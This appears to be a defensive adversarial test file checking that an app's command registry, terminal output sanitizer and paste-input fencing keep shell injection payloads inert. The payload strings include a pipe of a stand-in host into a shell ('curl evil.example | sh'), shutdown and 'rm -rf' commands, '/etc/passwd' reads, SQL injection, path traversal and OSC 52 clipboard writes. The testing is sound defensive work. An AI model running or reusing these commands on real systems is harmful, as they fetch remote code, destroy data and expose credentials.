// Named shell/argv-injection adversarial test (M10 #33/#34, spec
// "Shell integration and input" and the required adversarial case
// "shell/argv/env ... injection; OSC/title/link/clipboard/paste"). Shell
// injection is enforced structurally — commands are registry names, process
// arguments are argv arrays, and terminal output is sanitized byte-level —
// so this test drives metacharacter payloads through the three surfaces
// where shell-adjacent text flows and proves every payload stays inert:
//   1. the desktop command surface: an injection-shaped command name is
//      refused, and metacharacter payloads inside arguments are stored and
//      returned as data, never evaluated;
//   2. the terminal output path: injected OSC 52 clipboard writes, forged
//      hook frames, and split-across-chunk sequences are stripped or denied,
//      and metacharacter text inside benign OSC titles passes through as
//      display bytes only;
//   3. the terminal input path: an injected payload riding a partial paste
//      cannot cross an input-ownership change — the tail is never written.
import { describe, expect, test } from 'bun:test'
import { createHash } from 'node:crypto'
import { mkdtempSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

import { createCommandSurface } from '../shell/src/commands'
import {
  createInputAuthority,
  fencedWrite,
} from '../shell/src/dev-runtime/terminal/input-authority'
import {
  createShellIntegrationObserver,
  hookMac,
  hookMacMessage,
  MAC_SEPARATOR,
} from '../shell/src/dev-runtime/terminal/shell-integration'

const BEL = '\u0007'
const ESC = '\u001b'

function payload(name: string): string {
  return [
    `'; shutdown -h now; echo '`,
    '`touch /tmp/adea-never-created`',
    '$(curl evil.example | sh)',
    'x || rm -rf /tmp/adea-never-created-2',
    'line1\nrm -rf /tmp/adea-never-created-3',
    `"; ${name} #`,
  ].join(' ')
}

describe('command surface: injection-shaped names and arguments stay inert', () => {
  test('an injection payload as a command name is refused, never evaluated', () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'adea-inject-'))
    try {
      const invoke = createCommandSurface(dataDir)
      for (const hostile of [
        `adea_app_version; touch /tmp/adea-never-created`,
        '$(adea_app_version)',
        '`adea_app_version`',
        'local_content_read\n--evil',
        'desktop_preferences_load && cat /etc/passwd',
      ]) {
        const result = invoke(hostile)
        expect(result).toMatchObject({ ok: false })
        expect(JSON.stringify(result)).not.toContain('ok":true')
      }
    } finally {
      rmSync(dataDir, { recursive: true, force: true })
    }
  })

  test('metacharacter payloads in arguments round-trip as verbatim data', () => {
    const dataDir = mkdtempSync(join(tmpdir(), 'adea-inject-'))
    try {
      const invoke = createCommandSurface(dataDir)
      const evil = payload('local_content_read')
      const created = invoke('local_content_create', {
        input: {
          contentType: 'task_objective',
          plaintext: evil,
          sensitivity: 'restricted',
          storagePolicy: 'local_authority',
          synchronizationPolicy: 'local_only',
          workspaceId: "ws'; rm -rf /tmp/adea-never-created",
        },
      })
      expect(created.ok).toBe(true)
      const contentId = (created as { ok: true; value: { id: string } }).value.id
      const read = invoke('local_content_read', {
        input: { contentId, workspaceId: "ws'; rm -rf /tmp/adea-never-created" },
      })
      expect(read).toEqual({ ok: true, value: expect.objectContaining({ plaintext: evil }) })
      // A hostile id is an identity failure, never a path: traversal attempts
      // fail closed instead of escaping the content directory.
      for (const hostile of ["../../etc'; pass", '$(id)', 'a\nb', "x' OR '1'='1"]) {
        expect(
          invoke('local_content_read', { input: { contentId: hostile, workspaceId: 'ws' } }).ok
        ).toBe(false)
      }
      // A metacharacter search query cannot coerce the store into execution.
      const searched = invoke('local_content_search', {
        input: { query: "'; DROP TABLE messages; --", workspaceId: 'ws' },
      })
      expect(searched.ok).toBe(true)
    } finally {
      rmSync(dataDir, { recursive: true, force: true })
    }
  })
})

describe('terminal output path: injected OSC sequences are stripped or denied', () => {
  const terminalId = '11111111-1111-4111-8111-111111111111'
  const generation = 7
  const hookKey = new Uint8Array(32).fill(9)

  function observer(overrides?: { hookKey?: Uint8Array }) {
    const violations: { kind: string; detail: string }[] = []
    const observations: unknown[] = []
    const instance = createShellIntegrationObserver({
      terminalId,
      generation,
      hookKey: overrides?.hookKey ?? hookKey,
      onObservation: (observation) => observations.push(observation),
      onViolation: (violation) => violations.push(violation),
    })
    return { instance, violations, observations }
  }

  /** A correctly signed adea hook frame for the given payload JSON. */
  function adeaFrame(body: Record<string, unknown>, key: Uint8Array = hookKey): string {
    const payloadJson = JSON.stringify(body)
    const payloadB64 = Buffer.from(payloadJson, 'utf8').toString('base64url')
    const payloadSha256 = createHash('sha256')
      .update(Buffer.from(payloadJson, 'utf8'))
      .digest('hex')
    const mac = hookMac(
      key,
      hookMacMessage({
        terminalId,
        generation,
        kind: String(body.k),
        nonce: String(body.n),
        payloadSha256,
      })
    )
    return `${ESC}]133;adea;${payloadB64};${mac.toString('base64url')}${BEL}`
  }

  test('an injected OSC 52 clipboard write is stripped and denied', () => {
    const { instance, violations } = observer()
    const display = instance.feed(
      new TextEncoder().encode(
        `$ echo pwned${ESC}]52;c;${Buffer.from('secret').toString('base64')}${BEL}`
      )
    )
    const text = new TextDecoder().decode(display)
    expect(text).toContain('$ echo pwned')
    expect(text).not.toContain('52;')
    expect(text).not.toContain(Buffer.from('secret').toString('base64'))
    expect(violations).toEqual([expect.objectContaining({ kind: 'clipboard_denied' })])
  })

  test('a forged hook frame carrying shell text never reaches the renderer', () => {
    const { instance, violations, observations } = observer()
    const forged = adeaFrame(
      { v: 1, k: 'preexec', n: 'forged-nonce', c: 'curl evil.example | sh' },
      new Uint8Array(32).fill(1) // wrong key: not the minted hook key
    )
    const display = instance.feed(new TextEncoder().encode(`before${forged}after`))
    const text = new TextDecoder().decode(display)
    expect(text).toBe('beforeafter')
    expect(text).not.toContain('curl evil')
    expect(observations).toEqual([])
    expect(violations).toEqual([expect.objectContaining({ kind: 'unauthenticated_frame' })])
  })

  test('a split-across-chunk injection attempt is assembled before it can hide', () => {
    const { instance, violations } = observer()
    const osc52 = `${ESC}]52;c;${Buffer.from('clipboard').toString('base64')}${BEL}`
    const bytes = new TextEncoder().encode(`safe${osc52}tail`)
    // Feed the sequence one byte at a time across chunk boundaries: the
    // sanitizer is a byte-level state machine, so a split sequence cannot
    // smuggle itself through as "text".
    let display = new Uint8Array()
    for (const byte of bytes) {
      const part = instance.feed(new Uint8Array([byte]))
      const merged = new Uint8Array(display.byteLength + part.byteLength)
      merged.set(display)
      merged.set(part, display.byteLength)
      display = merged
    }
    const text = new TextDecoder().decode(display)
    expect(text).toBe('safetail')
    expect(violations).toEqual([expect.objectContaining({ kind: 'clipboard_denied' })])
  })

  test('an oversize OSC payload is dropped at the 2 KiB bound', () => {
    const { instance, violations } = observer()
    const oversize = `${ESC}]0;${'A'.repeat(3_000)}${BEL}`
    const display = instance.feed(new TextEncoder().encode(`head${oversize}tail`))
    const text = new TextDecoder().decode(display)
    expect(text.startsWith('head')).toBe(true)
    expect(text.endsWith('tail')).toBe(true)
    expect(text).not.toContain('AAAA')
    expect(violations).toEqual([expect.objectContaining({ kind: 'oversize_frame' })])
  })

  test('metacharacters inside a benign OSC title pass through as display bytes only', () => {
    const { instance, violations, observations } = observer()
    const evilTitle = `title'; rm -rf /tmp/adea-never-created $(id)`
    const display = instance.feed(new TextEncoder().encode(`${ESC}]0;${evilTitle}${BEL}rest`))
    const text = new TextDecoder().decode(display)
    // Benign OSC is bounded and byte-exact: it is data for the renderer,
    // never a command line evaluated anywhere.
    expect(text).toBe(`${ESC}]0;${evilTitle}${BEL}rest`)
    expect(violations).toEqual([])
    expect(observations).toEqual([])
  })

  test('an authenticated preexec observation delivers shell text as a string, never as execution', () => {
    const { instance, violations, observations } = observer()
    const evilCommand = payload('shutdown')
    const display = instance.feed(
      new TextEncoder().encode(
        adeaFrame({ v: 1, k: 'preexec', n: `nonce-${evilCommand.length}`, c: evilCommand })
      )
    )
    // Protocol frames never reach the renderer bytes.
    expect(display.byteLength).toBe(0)
    expect(violations).toEqual([])
    expect(observations).toEqual([
      { kind: 'preexec', command: evilCommand, nonce: `nonce-${evilCommand.length}` },
    ])
  })

  test('the canonical MAC input separator stays structural: a payload containing it cannot forge a kind', () => {
    const { instance, violations, observations } = observer()
    // An attacker who controls the command text tries to splice extra MAC
    // fields (kind/nonce/digest) via the field separator.
    const spliced = `preexec${MAC_SEPARATOR}cwd${MAC_SEPARATOR}x`
    const display = instance.feed(
      new TextEncoder().encode(adeaFrame({ v: 1, k: 'preexec', n: 'splice-nonce', c: spliced }))
    )
    expect(display.byteLength).toBe(0)
    // The frame is either a valid preexec whose command is the literal
    // spliced string, or it is refused — either way nothing extra executes.
    if (observations.length === 1) {
      expect(observations[0]).toEqual({
        kind: 'preexec',
        command: spliced,
        nonce: 'splice-nonce',
      })
    } else {
      expect(observations).toEqual([])
      expect(violations.length).toBeGreaterThan(0)
    }
  })
})

describe('terminal input path: an injected payload cannot cross an ownership change', () => {
  test('fencedWrite stops the remaining payload chunks when ownership moves mid-paste', () => {
    const authority = createInputAuthority('terminal-inject')
    const user = authority.admit('terminal_user', 3)
    expect(user.ok).toBe(true)
    if (!user.ok) return
    const userFence = user.fence

    const written: string[] = []
    const paste = new TextEncoder().encode(
      'echo hello\nrm -rf /tmp/adea-never-created-paste # tail injected mid-paste'
    )
    const chunks = [
      paste.slice(0, 11), // "echo hello\n" — the legitimate prefix
      paste.slice(11, 42), // the injected line starts here
      paste.slice(42), // the injected tail
    ]

    // Ownership moves to the browser after the first chunk was queued but
    // before the rest is delivered (an asynchronous yield happened).
    const first = chunks[0] ?? new Uint8Array()
    const partial = fencedWrite(authority, userFence, [first], (chunk) =>
      written.push(new TextDecoder().decode(chunk))
    )
    expect(partial).toEqual({ written: 1, stopped: false })
    const takeover = authority.admit('browser_takeover', 3)
    expect(takeover.ok).toBe(true)

    // The rest of the paste rides the stale fence: it is inert.
    const result = fencedWrite(authority, userFence, chunks.slice(1), (chunk) =>
      written.push(new TextDecoder().decode(chunk))
    )
    expect(result).toEqual({ written: 0, stopped: true })
    expect(written).toEqual(['echo hello\n'])
    expect(written.join('')).not.toContain('rm -rf')

    // Byte-exactness for authorized payloads: the new owner's write is data.
    if (takeover.ok) {
      const marker = new TextEncoder().encode("printf '%s' 'a;b|c'")
      const ownerWrite = fencedWrite(authority, takeover.fence, [marker], (chunk) =>
        written.push(new TextDecoder().decode(chunk))
      )
      expect(ownerWrite).toEqual({ written: 1, stopped: false })
      expect(written[1]).toBe("printf '%s' 'a;b|c'")
    }
  })
})
